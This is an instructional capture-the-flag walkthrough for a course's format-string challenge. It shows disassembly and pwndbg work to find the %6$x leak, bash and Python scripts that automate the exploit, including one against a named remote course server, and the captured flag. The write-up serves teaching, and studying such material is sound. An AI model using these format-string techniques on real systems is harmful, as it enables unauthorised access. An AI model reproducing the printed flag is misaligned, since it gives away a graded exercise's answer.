# formatstring1 Walkthrough (pwndbg)

This walkthrough shows exactly how to find and use the bug to print the flag.

## 1) Inspect the source and identify the bug

Open:
- `random-game.c`

Key code path:
```c
fgets(buf, size, stdin);
printf(buf);
```

Why this is vulnerable:
- `printf(buf)` treats your input as a format string.
- That means `%x`, `%p`, `%n`, etc. are interpreted by `printf`.
- You can read stack values directly (format string leak).

Goal:
- Leak `passcode` from stack.
- Send it back in the second prompt (`scanf("%x", &yourcode)`).

## 2) Confirm variable layout from disassembly (optional but useful)

### 2.1 What is objdump and why use it?

`objdump` disassembles compiled binaries into human-readable assembly code. We use it to:
- See where local variables are stored relative to `ebp` (stack frame pointer).
- Confirm the `printf` call location.
- Find the exact offset we need for our format string exploit.

### 2.2 Run the command

```bash
objdump -d random-game | grep -n "<main>" -A120
```

Breaking this down:
- `objdump -d random-game` — disassemble the binary
- `grep -n "<main>" -A120` — find the main function and show 120 lines after it (with line numbers `-n`)

The output will be long. Search for these specific instructions (Ctrl+F in your terminal):

### 2.3 Find these key lines (search for the hex value after `call`)

Look for these patterns and note their approximate line numbers:

**Find this pattern:**
```
mov %eax,-0x18(%ebp)
```
This stores the `passcode` variable at offset `ebp-0x18`.

**Find this pattern (search for `call` near printf):**
```
pushl -0x14(%ebp)
call ...printf
```
This is `printf(buf)` being called. The argument `buf` is at `ebp-0x14`.

**Find this pattern:**
```
cmp %eax,-0x18(%ebp)
```
This compares `yourcode` (in eax) with `passcode` (at `ebp-0x18`). This is your target match!

### 2.4 Understanding the offsets

From the C code:
```c
int passcode;      // stored at ebp-0x18
char buf[16];      // stored at ebp-0x14
int yourcode;      // stored somewhere on stack
```

When `printf(buf)` is called:
- Arguments to `printf` are on the stack
- Format string specifiers like `%x` read from the stack
- We do not assume the exact position yet; we find it by testing indexes.

### 2.5 How to find the correct index yourself (this is how we get 6)

You can discover the right index by testing `%1$x`, `%2$x`, `%3$x`, ... and checking which leaked value is accepted as the passcode in the same run.

Fast way (auto-test indexes 1..12):

```bash
for i in $(seq 1 12); do
	out=$(bash -lc '
set -euo pipefail
idx="$1"
coproc P { ./random-game; }
while IFS= read -r line <&"${P[0]}"; do
	[[ "$line" == *"passcode to enter here?"* ]] && break
done
printf "%%%s\$x\n" "$idx" >&"${P[1]}"
IFS= read -r leak <&"${P[0]}"
while IFS= read -r line <&"${P[0]}"; do
	[[ "$line" == *"Again!"* ]] && break
done
printf "%s\n" "$leak" >&"${P[1]}"
cat <&"${P[0]}"
' _ "$i" 2>/dev/null)

	if printf "%s" "$out" | grep -q "Oh. You got the passcode"; then
		echo "idx=$i SUCCESS"
	else
		echo "idx=$i fail"
	fi
done
```

Expected result pattern:

```text
idx=1 fail
idx=2 fail
idx=3 fail
idx=4 fail
idx=5 fail
idx=6 SUCCESS
idx=7 fail
...
```

That is the practical proof that `%6$x` is the right leak in this binary.

### 2.6 Disassembly sanity-check (optional)

Run this to see the actual output:
```bash
$ objdump -d random-game | grep -n "<main>" -A120 | head -50
```

Look for lines containing:
- `-0x18(%ebp)` (passcode storage location)
- `printf` or `_IO_printf` (the printf call)

The exact line numbers don't matter—what matters is understanding that:
- `passcode` is at a fixed offset from `ebp`
- `printf(buf)` reads from the stack
- Those two locations align at the 6th format specifier (`%6$x`)

### 2.7 Manual no-script way to get index 6 (recommended to learn)

If you want to derive the index by hand (not brute force), do this:

1. Find the vulnerable call site in disassembly:

```bash
objdump -d random-game | grep -n "_IO_printf\|<main>" -A80
```

Look for this line pair in `main`:

```asm
ff 75 ec                pushl  -0x14(%ebp)
e8 8c 3d 00 00          call   804d8d0 <_IO_printf>
```

The `call` instruction address here is `0x8049b3f`.

2. Break exactly at that call and inspect memory:

```bash
printf 'AAAA\n0\n' > in.txt
gdb -q ./random-game
```

In gdb/pwndbg:

```gdb
b *0x8049b3f
run < in.txt
p/x *(unsigned int*)($ebp-0x18)
x/12wx $esp
p/d ((($ebp-0x18)-($esp+4))/4)+1
```

Example output:

```text
Breakpoint 1, 0x08049b3f in main ()
$1 = 0x33e965bc
0xffffc958:     0xffffc95c      0x41414141      0x0810000a      0x08049090
0xffffc968:     0x08049a22      0x080cb736      0x33e965bc      0xffffc95c
0xffffc978:     0x0000000f      0x00000010      0x08106ff4      0x08106ff4
$2 = 6
```

How to read that output:
- `Breakpoint 1, 0x08049b3f in main ()`:
	gdb stopped at the printf call instruction in `main`.
- `$1 = 0x33e965bc`:
	this is the current `passcode` value read directly from `($ebp-0x18)`.
- `x/12wx $esp` dump:
	shows 12 stack words at call time.
	one of those words is also `0x33e965bc`, so passcode is present in the argument-read area.
- `$2 = 6`:
	this is the computed positional index using
	`((($ebp-0x18)-($esp+4))/4)+1`.
	Therefore the matching format leak is `%6$x`.

Why `+4` appears in the formula:
- At the call site, `$esp` points to the format-string pointer itself (`buf`).
- Positional reads for `%1$x`, `%2$x`, ... start from the next word (`$esp+4`).

Cleanup:

```bash
rm -f in.txt
```

## 3) Use pwndbg to prove the correct stack offset

### 3.1 Break after the second input is read

This lets us compare:
- what `%6$x` printed, and
- the real `passcode` in memory.

Create a small input file:
```bash
printf '%%6$x\n0\n' > in.txt
```

Run gdb/pwndbg:
```bash
gdb -q ./random-game
```

In pwndbg:
```gdb
b *0x08049b81
run < in.txt
p/x *(int*)($ebp-0x18)
```

What `p/x *(int*)($ebp-0x18)` means:
- `p` = print in gdb
- `/x` = show value in hexadecimal
- `($ebp-0x18)` = address of local variable slot where `passcode` lives
- `(int*)` = treat that address as pointer to 4-byte integer
- `*` = dereference (read value at that address)

So this command reads the real `passcode` value from memory and prints it in hex.

What you should see:
- Program output prints one hex value after first prompt (from `%6$x`).
- `p/x *(int*)($ebp-0x18)` prints the same hex value.

So `%6$x` is leaking `passcode`.

Clean up:
```bash
rm -f in.txt
```

## 4) Exploit manually

Run the binary normally:
```bash
./random-game
```

At first prompt enter:
```text
%6$x
```

Program prints something like:
```text
221d13a7
```

At second prompt enter that exact hex value:
```text
221d13a7
```

If correct, program follows success branch and executes:
```c
system("cat flag.answer");
```

## 5) Why offset 6 works (quick intuition)

At the vulnerable call site, only one argument is actually passed (`buf`), but format specifiers ask `printf` for more arguments anyway.

On 32-bit x86, those extra reads come from stack words in the caller frame.
The sixth word aligns with local `passcode` (`ebp-0x18`) in this binary.

## 6) Quick checklist

- Find unsafe `printf(user_input)`.
- Confirm passcode is a stack local.
- Find stack index that leaks it (`%6$x`).
- Reuse leaked value at second prompt.
- Get flag from success branch.

## 7) Common mistakes

- Using too long payload: first input buffer is only 16 bytes.
- Typing decimal instead of hex at second prompt.
- Including extra spaces/newlines when copying the leak.
- Assuming same offset on every binary (offset is per-build).

## 8) Optional: one-command local test

This runs the whole attack automatically (leak then reuse):

```bash
bash -lc '
coproc P { ./random-game; }
while IFS= read -r line <&"${P[0]}"; do
	[[ "$line" == *"passcode to enter here?"* ]] && break
done
printf "%%6\$x\n" >&"${P[1]}"
IFS= read -r leak <&"${P[0]}"
while IFS= read -r line <&"${P[0]}"; do
	[[ "$line" == *"Again!"* ]] && break
done
printf "%s\n" "$leak" >&"${P[1]}"
cat <&"${P[0]}"
'
```

If `flag.answer` is present, the binary will print it in the success path.

## 9) Remote solve (moa6.eecs.utk.edu:32100)

Target:
- Host: `moa6.eecs.utk.edu`
- Port: `32100`

### 9.1 One-command remote exploit

Run from this folder:

```bash
bash -lc '
set -euo pipefail
coproc P { nc moa6.eecs.utk.edu 32100; }

# Wait for first prompt
while IFS= read -r line <&"${P[0]}"; do
	echo "$line"
	[[ "$line" == *"passcode to enter here?"* ]] && break
done

# Leak passcode from stack
printf "%%6\$x\n" >&"${P[1]}"
IFS= read -r leak <&"${P[0]}"
echo "$leak"

# Wait for second prompt
while IFS= read -r line <&"${P[0]}"; do
	echo "$line"
	[[ "$line" == *"Again!"* ]] && break
done

# Send leaked passcode back
printf "%s\n" "$leak" >&"${P[1]}"
cat <&"${P[0]}"
'
```

### 9.2 Verified successful output

Observed on run:

```text
------------------------------------------
>> What's the passcode to enter here?
2cfa35f0
>> Again! What's the passcode to enter here?
>> Oh. You got the passcode to enter here. Flag is 
cosc466-flag-{z4-TXkh#wu&7E4vN}
```

Note:
- `^C` can appear after success when the socket session is manually interrupted.
- That does not indicate exploit failure.

## 10) Python script version (commented)

File:
- `exploit_remote.py`

Run:
```bash
/home/jbenjam7/.pyenv/versions/3.11.0/bin/python exploit_remote.py
```

What to read in the script:
- `HOST` and `PORT`: target details.
- `LEAK_PAYLOAD = b"%6$x\\n"`: format-string leak payload.
- `recv_until(...)`: helper that waits for exact challenge prompts.
- `main()`:
	- connects to remote service,
	- waits for first prompt,
	- sends leak payload,
	- parses leaked passcode,
	- sends it back at second prompt,
	- prints remaining output (flag).

Verified result from script run:
```text
>> Oh. You got the passcode to enter here. Flag is 
cosc466-flag-{z4-TXkh#wu&7E4vN}
```
